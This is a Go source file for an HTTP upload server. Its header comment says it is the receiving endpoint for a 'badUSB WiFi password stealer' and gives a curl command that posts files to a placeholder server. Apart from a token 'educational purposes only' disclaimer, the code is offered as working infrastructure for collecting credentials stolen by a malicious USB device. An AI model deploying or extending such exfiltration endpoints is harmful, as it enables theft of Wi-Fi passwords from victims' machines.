/** 
Send files as curl -X POST -F "file=@/path/to/your/file.txt" http://YOURSERVER:PORT/upload

Made this to have an endpoint for the badUSB WiFi password stealer.
Ofcourse this is all for educational purposes only.

Why in go? A compiled binary runs on almost any box :evilparrot:

**/
package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const (
	port       = 8080
	uploadPath = "./uploads"
)

func main() {
	if err := os.MkdirAll(uploadPath, os.ModePerm); err != nil {
		fmt.Println("Error creating upload directory:", err)
		return
	}

	http.HandleFunc("/upload", uploadHandler)

	go func() {
		if err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil); err != nil {
			fmt.Println("Error starting server:", err)
		}
	}()

	fmt.Printf("Server listening on :%d\n", port)

	select {}
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	err := r.ParseMultipartForm(10 << 20) // 10 MB limit
	if err != nil {
		http.Error(w, "Unable to parse form", http.StatusBadRequest)
		return
	}

	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Unable to get file from form", http.StatusBadRequest)
		return
	}
	defer file.Close()

	fileName := fmt.Sprintf("%d_%s", time.Now().UnixNano(), handler.Filename)

	filePath := filepath.Join(uploadPath, fileName)

	out, err := os.Create(filePath)
	if err != nil {
		http.Error(w, "Unable to create file on server", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	_, err = io.Copy(out, file)
	if err != nil {
		http.Error(w, "Error copying file content", http.StatusInternalServerError)
		return
	}

	w.Write([]byte("File uploaded successfully."))
}
